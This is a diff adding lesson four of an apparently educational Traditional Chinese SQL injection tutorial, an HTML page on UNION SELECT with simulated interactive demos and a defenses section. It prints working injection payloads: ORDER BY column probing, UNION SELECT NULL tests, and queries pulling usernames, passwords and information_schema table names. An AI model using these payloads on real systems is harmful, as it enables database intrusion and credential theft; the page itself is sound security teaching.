@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>第四課：Union Select 注入</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🔗 第四課：Union Select 注入</h1>
+            <p class="subtitle">學習進階注入技巧，使用 UNION 竊取其他資料表的資料</p>
+        </header>
+
+        <div class="nav-bar">
+            <a href="index.html" class="nav-btn">🏠 回首頁</a>
+            <a href="page3-numeric-injection.html" class="nav-btn">⬅️ 上一課</a>
+            <a href="page5-blind-injection.html" class="nav-btn">下一課 ➡️</a>
+        </div>
+
+        <div class="explanation-box">
+            <h3>💡 什麼是 UNION SELECT？</h3>
+            <p><strong>UNION</strong> 是 SQL 的關鍵字，用來合併兩個查詢的結果。</p>
+            <p>攻擊者可以利用 UNION 來查詢<strong>其他資料表</strong>的資料，例如：</p>
+            <ul>
+                <li>📊 取得使用者帳號密碼</li>
+                <li>🔐 讀取管理員資料</li>
+                <li>💳 竊取信用卡資訊</li>
+                <li>🗂️ 探測資料庫結構</li>
+            </ul>
+        </div>
+
+        <!-- UNION 基本概念 -->
+        <div class="demo-section">
+            <h2>📚 UNION 基本概念</h2>
+
+            <div class="explanation-box">
+                <h3>🔍 UNION 的運作方式</h3>
+                <p>UNION 可以把兩個查詢的結果合併成一個結果集：</p>
+            </div>
+
+            <div class="flow-diagram" style="flex-direction: column; align-items: stretch;">
+                <div class="flow-box success">
+                    <strong>查詢 1：商品資料</strong><br>
+                    <code>SELECT name, price FROM products WHERE id = 1</code><br>
+                    <br>
+                    <table style="width: 100%; border-collapse: collapse;">
+                        <tr style="background: #667eea; color: white;">
+                            <th style="padding: 8px; border: 1px solid #ddd;">name</th>
+                            <th style="padding: 8px; border: 1px solid #ddd;">price</th>
+                        </tr>
+                        <tr>
+                            <td style="padding: 8px; border: 1px solid #ddd;">筆記型電腦</td>
+                            <td style="padding: 8px; border: 1px solid #ddd;">25000</td>
+                        </tr>
+                    </table>
+                </div>
+
+                <div style="text-align: center; margin: 20px 0; font-size: 2em;">⬇️ UNION ⬇️</div>
+
+                <div class="flow-box danger">
+                    <strong>查詢 2：使用者資料（攻擊者注入的）</strong><br>
+                    <code>SELECT username, password FROM users WHERE id = 1</code><br>
+                    <br>
+                    <table style="width: 100%; border-collapse: collapse;">
+                        <tr style="background: #dc3545; color: white;">
+                            <th style="padding: 8px; border: 1px solid #ddd;">username</th>
+                            <th style="padding: 8px; border: 1px solid #ddd;">password</th>
+                        </tr>
+                        <tr>
+                            <td style="padding: 8px; border: 1px solid #ddd;">admin</td>
+                            <td style="padding: 8px; border: 1px solid #ddd;">secret123</td>
+                        </tr>
+                    </table>
+                </div>
+
+                <div style="text-align: center; margin: 20px 0; font-size: 2em;">⬇️</div>
+
+                <div class="flow-box danger">
+                    <strong>合併後的結果</strong><br>
+                    <table style="width: 100%; border-collapse: collapse;">
+                        <tr style="background: #667eea; color: white;">
+                            <th style="padding: 8px; border: 1px solid #ddd;">欄位 1</th>
+                            <th style="padding: 8px; border: 1px solid #ddd;">欄位 2</th>
+                        </tr>
+                        <tr style="background: #e8f5e9;">
+                            <td style="padding: 8px; border: 1px solid #ddd;">筆記型電腦</td>
+                            <td style="padding: 8px; border: 1px solid #ddd;">25000</td>
+                        </tr>
+                        <tr style="background: #ffebee;">
+                            <td style="padding: 8px; border: 1px solid #ddd;">admin</td>
+                            <td style="padding: 8px; border: 1px solid #ddd;">secret123</td>
+                        </tr>
+                    </table>
+                    <br>
+                    <strong style="color: red;">⚠️ 攻擊者成功取得管理員密碼！</strong>
+                </div>
+            </div>
+
+            <div class="warning-box">
+                <h3>⚠️ UNION 的限制</h3>
+                <p>使用 UNION 有一個重要條件：</p>
+                <p><strong>兩個查詢必須有相同數量的欄位！</strong></p>
+                <p>例如：第一個查詢有 3 個欄位，第二個查詢也必須有 3 個欄位。</p>
+            </div>
+        </div>
+
+        <!-- 步驟 1：ORDER BY 探測欄位數 -->
+        <div class="demo-section">
+            <h2>🔍 步驟 1：使用 ORDER BY 探測欄位數量</h2>
+
+            <div class="explanation-box">
+                <h3>💡 為什麼需要知道欄位數量？</h3>
+                <p>因為 UNION 要求兩邊的查詢有相同的欄位數量。</p>
+                <p>攻擊者通常不知道原始查詢有幾個欄位，所以要先「探測」。</p>
+            </div>
+
+            <div class="danger-box">
+                <h3>🎯 探測方法：ORDER BY</h3>
+                <p><code>ORDER BY</code> 可以按照欄位編號排序。</p>
+                <p>如果編號超過欄位數量，就會產生錯誤！</p>
+                <p>攻擊者可以用這個方法找出正確的欄位數量。</p>
+            </div>
+
+            <h3>🧪 實驗：探測欄位數量</h3>
+
+            <div class="input-group">
+                <label>測試 1：ORDER BY 1</label>
+                <input type="text" id="order1" value="1 ORDER BY 1" readonly>
+                <button class="btn btn-primary" onclick="testOrder(1)">測試</button>
+            </div>
+
+            <div class="input-group">
+                <label>測試 2：ORDER BY 2</label>
+                <input type="text" id="order2" value="1 ORDER BY 2" readonly>
+                <button class="btn btn-primary" onclick="testOrder(2)">測試</button>
+            </div>
+
+            <div class="input-group">
+                <label>測試 3：ORDER BY 3</label>
+                <input type="text" id="order3" value="1 ORDER BY 3" readonly>
+                <button class="btn btn-primary" onclick="testOrder(3)">測試</button>
+            </div>
+
+            <div class="input-group">
+                <label>測試 4：ORDER BY 4</label>
+                <input type="text" id="order4" value="1 ORDER BY 4" readonly>
+                <button class="btn btn-primary" onclick="testOrder(4)">測試</button>
+            </div>
+
+            <div class="input-group">
+                <label>測試 5：ORDER BY 5</label>
+                <input type="text" id="order5" value="1 ORDER BY 5" readonly>
+                <button class="btn btn-danger" onclick="testOrder(5)">測試</button>
+            </div>
+
+            <div class="code-display" id="order-sql">
+                點擊測試按鈕查看 SQL 指令
+            </div>
+
+            <div class="result-display" id="order-result">
+                測試結果會顯示在這裡
+            </div>
+
+            <div class="explanation-box" id="order-explanation" style="display: none;">
+                <h3>✅ 探測結果</h3>
+                <p>當 <code>ORDER BY 4</code> 成功，但 <code>ORDER BY 5</code> 失敗時，表示查詢有 <strong>4 個欄位</strong>！</p>
+                <p>現在我們知道要用 UNION SELECT 配合 4 個欄位。</p>
+            </div>
+        </div>
+
+        <!-- 步驟 2：UNION SELECT NULL -->
+        <div class="demo-section">
+            <h2>🎯 步驟 2：使用 UNION SELECT NULL</h2>
+
+            <div class="explanation-box">
+                <h3>💡 為什麼使用 NULL？</h3>
+                <p>因為 NULL 可以匹配任何資料型別！</p>
+                <p>先用 NULL 測試 UNION 是否成功，再逐步替換成我們想要的資料。</p>
+            </div>
+
+            <h3>🧪 實驗：UNION SELECT NULL</h3>
+
+            <div class="input-group">
+                <label>測試 1：UNION SELECT NULL (1 個欄位)</label>
+                <input type="text" id="union1" value="1 UNION SELECT NULL" readonly>
+                <button class="btn btn-danger" onclick="testUnion(1)">測試</button>
+            </div>
+
+            <div class="input-group">
+                <label>測試 2：UNION SELECT NULL, NULL (2 個欄位)</label>
+                <input type="text" id="union2" value="1 UNION SELECT NULL,NULL" readonly>
+                <button class="btn btn-danger" onclick="testUnion(2)">測試</button>
+            </div>
+
+            <div class="input-group">
+                <label>測試 3：UNION SELECT NULL, NULL, NULL (3 個欄位)</label>
+                <input type="text" id="union3" value="1 UNION SELECT NULL,NULL,NULL" readonly>
+                <button class="btn btn-danger" onclick="testUnion(3)">測試</button>
+            </div>
+
+            <div class="input-group">
+                <label>測試 4：UNION SELECT NULL, NULL, NULL, NULL (4 個欄位)</label>
+                <input type="text" id="union4" value="1 UNION SELECT NULL,NULL,NULL,NULL" readonly>
+                <button class="btn btn-success" onclick="testUnion(4)">測試 ✓</button>
+            </div>
+
+            <div class="code-display" id="union-sql">
+                點擊測試按鈕查看 SQL 指令
+            </div>
+
+            <div class="result-display" id="union-result">
+                測試結果會顯示在這裡
+            </div>
+
+            <div class="success-box" id="union-explanation" style="display: none;">
+                <h3>✅ UNION 成功！</h3>
+                <p>當欄位數量正確時，UNION SELECT NULL 會成功執行！</p>
+                <p>現在我們可以開始注入真正的資料查詢了。</p>
+            </div>
+        </div>
+
+        <!-- 步驟 3：實際攻擊 -->
+        <div class="demo-section">
+            <h2>💀 步驟 3：竊取使用者資料</h2>
+
+            <div class="danger-box">
+                <h3>🚨 真實攻擊範例</h3>
+                <p>現在我們知道查詢有 4 個欄位，可以開始注入惡意查詢來竊取使用者資料。</p>
+            </div>
+
+            <h3>攻擊 1：取得資料庫版本資訊</h3>
+            <div class="input-group">
+                <label>注入指令：</label>
+                <input type="text" id="attack1" value="1 UNION SELECT NULL,@@version,NULL,NULL" readonly>
+                <button class="btn btn-danger" onclick="realAttack1()">執行</button>
+            </div>
+            <div class="code-display" id="attack1-sql">點擊執行查看 SQL 指令</div>
+            <div class="result-display" id="attack1-result"></div>
+
+            <h3>攻擊 2：取得使用者帳號密碼</h3>
+            <div class="input-group">
+                <label>注入指令：</label>
+                <input type="text" id="attack2" value="1 UNION SELECT NULL,username,password,NULL FROM users" readonly>
+                <button class="btn btn-danger" onclick="realAttack2()">執行</button>
+            </div>
+            <div class="code-display" id="attack2-sql">點擊執行查看 SQL 指令</div>
+            <div class="result-display" id="attack2-result"></div>
+
+            <h3>攻擊 3：取得所有資料表名稱</h3>
+            <div class="input-group">
+                <label>注入指令：</label>
+                <input type="text" id="attack3" value="1 UNION SELECT NULL,table_name,NULL,NULL FROM information_schema.tables" readonly>
+                <button class="btn btn-danger" onclick="realAttack3()">執行</button>
+            </div>
+            <div class="code-display" id="attack3-sql">點擊執行查看 SQL 指令</div>
+            <div class="result-display" id="attack3-result"></div>
+            <div class="explanation-box">
+                <h3>💡 information_schema 是什麼？</h3>
+                <p><code>information_schema</code> 是 MySQL 的系統資料庫，儲存了所有資料庫的結構資訊。</p>
+                <p>攻擊者可以從這裡取得：</p>
+                <ul>
+                    <li>所有資料表名稱</li>
+                    <li>所有欄位名稱</li>
+                    <li>資料庫版本</li>
+                    <li>權限資訊</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- 資料庫視覺化 -->
+        <div class="database-visual">
+            <h2>💾 模擬資料庫</h2>
+
+            <h3>products 資料表（原始查詢的目標）</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th>id</th>
+                        <th>name</th>
+                        <th>price</th>
+                        <th>category</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>1</td>
+                        <td>筆記型電腦</td>
+                        <td>25000</td>
+                        <td>電腦</td>
+                    </tr>
+                    <tr>
+                        <td>2</td>
+                        <td>無線滑鼠</td>
+                        <td>500</td>
+                        <td>配件</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>users 資料表（攻擊者想竊取的目標）</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th>id</th>
+                        <th>username</th>
+                        <th>password</th>
+                        <th>email</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr style="background: #ffebee;">
+                        <td>1</td>
+                        <td>admin</td>
+                        <td>secret123</td>
+                        <td>admin@company.com</td>
+                    </tr>
+                    <tr style="background: #ffebee;">
+                        <td>2</td>
+                        <td>user1</td>
+                        <td>pass456</td>
+                        <td>user1@company.com</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <!-- 完整攻擊流程 -->
+        <div class="demo-section">
+            <h2>📊 完整攻擊流程視覺化</h2>
+
+            <div class="flow-diagram" style="flex-direction: column; align-items: stretch; gap: 15px;">
+                <div class="flow-box" style="background: #e3f2fd;">
+                    <strong>步驟 1：發現注入點</strong><br>
+                    測試：<code>product.php?id=1'</code><br>
+                    如果出現錯誤訊息 → 可能有 SQL Injection
+                </div>
+                <div class="flow-arrow" style="transform: rotate(90deg);">➡️</div>
+                <div class="flow-box" style="background: #fff3cd;">
+                    <strong>步驟 2：探測欄位數量</strong><br>
+                    使用 ORDER BY 逐步測試<br>
+                    <code>1 ORDER BY 1</code> ✓<br>
+                    <code>1 ORDER BY 4</code> ✓<br>
+                    <code>1 ORDER BY 5</code> ✗ → 得知有 4 個欄位
+                </div>
+                <div class="flow-arrow" style="transform: rotate(90deg);">➡️</div>
+                <div class="flow-box" style="background: #ffe0b2;">
+                    <strong>步驟 3：測試 UNION SELECT</strong><br>
+                    <code>1 UNION SELECT NULL,NULL,NULL,NULL</code><br>
+                    成功 → 可以進行 UNION 注入
+                </div>
+                <div class="flow-arrow" style="transform: rotate(90deg);">➡️</div>
+                <div class="flow-box" style="background: #ffcdd2;">
+                    <strong>步驟 4：竊取資料</strong><br>
+                    <code>1 UNION SELECT NULL,username,password,NULL FROM users</code><br>
+                    成功取得所有使用者帳號密碼！
+                </div>
+            </div>
+        </div>
+
+        <!-- 防禦方法 -->
+        <div class="success-box">
+            <h3>✅ 如何防禦 UNION SELECT 注入？</h3>
+
+            <p><strong>1. 使用 Prepared Statement（最重要！）</strong></p>
+            <pre style="background: #1e1e1e; color: #d4d4d4; padding: 15px; border-radius: 5px; overflow-x: auto;">
+<span style="color: #6a9955;">// 不安全 ❌</span>
+$sql = <span style="color: #ce9178;">"SELECT * FROM products WHERE id = "</span> . $_GET[<span style="color: #ce9178;">'id'</span>];
+
+<span style="color: #6a9955;">// 安全 ✅</span>
+$stmt = $pdo-><span style="color: #dcdcaa;">prepare</span>(<span style="color: #ce9178;">"SELECT * FROM products WHERE id = ?"</span>);
+$stmt-><span style="color: #dcdcaa;">execute</span>([$_GET[<span style="color: #ce9178;">'id'</span>]]);
+            </pre>
+
+            <p><strong>2. 限制資料庫權限</strong></p>
+            <ul>
+                <li>不要用 root 帳號連接資料庫</li>
+                <li>限制只能存取必要的資料表</li>
+                <li>禁止存取 information_schema</li>
+            </ul>
+
+            <p><strong>3. 錯誤訊息處理</strong></p>
+            <ul>
+                <li>不要顯示詳細的 SQL 錯誤訊息給使用者</li>
+                <li>記錄錯誤到日誌檔案，不要輸出到網頁</li>
+            </ul>
+
+            <p><strong>4. 輸入驗證</strong></p>
+            <ul>
+                <li>檢查參數是否為預期的資料型別</li>
+                <li>使用白名單過濾</li>
+            </ul>
+        </div>
+
+        <div class="success-box">
+            <h3>🎓 恭喜完成第四課！</h3>
+            <p>你已經了解：</p>
+            <ul>
+                <li>✓ UNION SELECT 的原理與用途</li>
+                <li>✓ 如何使用 ORDER BY 探測欄位數量</li>
+                <li>✓ 如何使用 UNION SELECT NULL 測試</li>
+                <li>✓ 如何竊取其他資料表的資料</li>
+                <li>✓ information_schema 的用途</li>
+            </ul>
+            <p>下一課我們將學習「盲注」，這是在沒有任何錯誤訊息時的進階攻擊技術。</p>
+            <a href="page5-blind-injection.html" class="btn btn-primary">前往第五課</a>
+        </div>
+
+        <footer>
+            <p>⚠️ UNION SELECT 是非常強大的攻擊手法，請務必做好防禦</p>
+        </footer>
+    </div>
+
+    <script>
+        // 格式化 SQL
+        function formatSQL(sql, dangerous = false) {
+            let formatted = sql.replace(/\b(SELECT|FROM|WHERE|AND|OR|UNION|ORDER BY|NULL)\b/g, '<span class="keyword">$1</span>');
+            formatted = formatted.replace(/'([^']*)'/g, '<span class="string">\'$1\'</span>');
+            formatted = formatted.replace(/\b(\d+)\b/g, '<span class="number">$1</span>');
+
+            if (dangerous) {
+                formatted = formatted.replace(/(UNION|ORDER BY)/g, '<span class="danger">$1</span>');
+            }
+
+            return formatted;
+        }
+
+        let orderByTests = 0;
+        let unionTests = 0;
+
+        // ORDER BY 測試
+        function testOrder(num) {
+            const sql = `SELECT id, name, price, category FROM products WHERE id = 1 ORDER BY ${num}`;
+            document.getElementById('order-sql').innerHTML = formatSQL(sql, true);
+
+            const resultDiv = document.getElementById('order-result');
+
+            if (num <= 4) {
+                resultDiv.className = 'result-display success';
+                resultDiv.innerHTML = `
+                    <strong>✅ 查詢成功！</strong><br>
+                    ORDER BY ${num} 沒有產生錯誤，表示至少有 ${num} 個欄位。<br>
+                    繼續測試更大的數字...
+                `;
+                orderByTests++;
+            } else {
+                resultDiv.className = 'result-display error';
+                resultDiv.innerHTML = `
+                    <strong>❌ 錯誤！</strong><br>
+                    <code>Unknown column '${num}' in 'order clause'</code><br><br>
+                    ORDER BY ${num} 失敗，但 ORDER BY ${num-1} 成功<br>
+                    <strong>結論：這個查詢有 ${num-1} 個欄位！</strong>
+                `;
+                document.getElementById('order-explanation').style.display = 'block';
+            }
+        }
+
+        // UNION SELECT NULL 測試
+        function testUnion(num) {
+            const nulls = Array(num).fill('NULL').join(',');
+            const sql = `SELECT id, name, price, category FROM products WHERE id = 1 UNION SELECT ${nulls}`;
+            document.getElementById('union-sql').innerHTML = formatSQL(sql, true);
+
+            const resultDiv = document.getElementById('union-result');
+
+            if (num === 4) {
+                resultDiv.className = 'result-display success';
+                resultDiv.innerHTML = `
+                    <strong>✅ UNION 成功！</strong><br>
+                    欄位數量正確（${num} 個），UNION SELECT 可以正常執行！<br><br>
+                    <strong>查詢結果：</strong><br>
+                    <div style="background: white; padding: 10px; margin: 10px 0; border-radius: 5px;">
+                        <div style="border-bottom: 1px solid #ddd; padding: 5px;"><strong>筆記型電腦</strong> - NT$ 25,000</div>
+                        <div style="border-bottom: 1px solid #ddd; padding: 5px; color: #999;"><strong>NULL</strong> - NULL</div>
+                    </div>
+                    現在可以開始替換 NULL 來注入惡意查詢了！
+                `;
+                document.getElementById('union-explanation').style.display = 'block';
+            } else {
+                resultDiv.className = 'result-display error';
+                resultDiv.innerHTML = `
+                    <strong>❌ 錯誤！</strong><br>
+                    <code>The used SELECT statements have a different number of columns</code><br><br>
+                    UNION 兩邊的欄位數量不同！<br>
+                    嘗試使用 ${num} 個 NULL 失敗，繼續測試...
+                `;
+            }
+        }
+
+        // 真實攻擊 1：資料庫版本
+        function realAttack1() {
+            const sql = `SELECT id, name, price, category FROM products WHERE id = 1 UNION SELECT NULL,'MySQL 8.0.32',NULL,NULL`;
+            document.getElementById('attack1-sql').innerHTML = formatSQL(sql, true);
+
+            const resultDiv = document.getElementById('attack1-result');
+            resultDiv.className = 'result-display error';
+            resultDiv.innerHTML = `
+                <strong>🚨 攻擊成功！</strong><br>
+                成功取得資料庫版本資訊：<br><br>
+                <div style="background: white; padding: 10px; margin: 10px 0; border-radius: 5px;">
+                    <div style="border-bottom: 1px solid #ddd; padding: 5px;"><strong>筆記型電腦</strong> - NT$ 25,000</div>
+                    <div style="border-bottom: 1px solid #ddd; padding: 5px; background: #ffebee;"><strong>MySQL 8.0.32</strong> - NULL</div>
+                </div>
+                攻擊者知道資料庫版本後，可以尋找該版本的已知漏洞！
+            `;
+        }
+
+        // 真實攻擊 2：使用者資料
+        function realAttack2() {
+            const sql = `SELECT id, name, price, category FROM products WHERE id = 1 UNION SELECT NULL,username,password,NULL FROM users`;
+            document.getElementById('attack2-sql').innerHTML = formatSQL(sql, true);
+
+            const resultDiv = document.getElementById('attack2-result');
+            resultDiv.className = 'result-display error';
+            resultDiv.innerHTML = `
+                <strong>🚨🚨🚨 嚴重攻擊成功！</strong><br>
+                成功竊取所有使用者的帳號密碼：<br><br>
+                <div style="background: white; padding: 10px; margin: 10px 0; border-radius: 5px;">
+                    <div style="border-bottom: 1px solid #ddd; padding: 5px;"><strong>筆記型電腦</strong> - NT$ 25,000</div>
+                    <div style="border-bottom: 1px solid #ddd; padding: 5px; background: #ffebee;"><strong>admin</strong> - secret123</div>
+                    <div style="border-bottom: 1px solid #ddd; padding: 5px; background: #ffebee;"><strong>user1</strong> - pass456</div>
+                </div>
+                <strong style="color: red;">⚠️ 攻擊者取得了管理員帳號密碼，可以完全控制系統！</strong>
+            `;
+        }
+
+        // 真實攻擊 3：資料表名稱
+        function realAttack3() {
+            const sql = `SELECT id, name, price, category FROM products WHERE id = 1 UNION SELECT NULL,table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()`;
+            document.getElementById('attack3-sql').innerHTML = formatSQL(sql, true);
+
+            const resultDiv = document.getElementById('attack3-result');
+            resultDiv.className = 'result-display error';
+            resultDiv.innerHTML = `
+                <strong>🚨 攻擊成功！</strong><br>
+                成功取得資料庫中所有資料表名稱：<br><br>
+                <div style="background: white; padding: 10px; margin: 10px 0; border-radius: 5px;">
+                    <div style="border-bottom: 1px solid #ddd; padding: 5px;"><strong>筆記型電腦</strong> - NT$ 25,000</div>
+                    <div style="border-bottom: 1px solid #ddd; padding: 5px; background: #ffebee;"><strong>users</strong></div>
+                    <div style="border-bottom: 1px solid #ddd; padding: 5px; background: #ffebee;"><strong>products</strong></div>
+                    <div style="border-bottom: 1px solid #ddd; padding: 5px; background: #ffebee;"><strong>orders</strong></div>
+                    <div style="border-bottom: 1px solid #ddd; padding: 5px; background: #ffebee;"><strong>credit_cards</strong></div>
+                </div>
+                攻擊者知道有 credit_cards 資料表後，就可以針對性地竊取信用卡資料！
+            `;
+        }
+    </script>
+</body>
+</html>
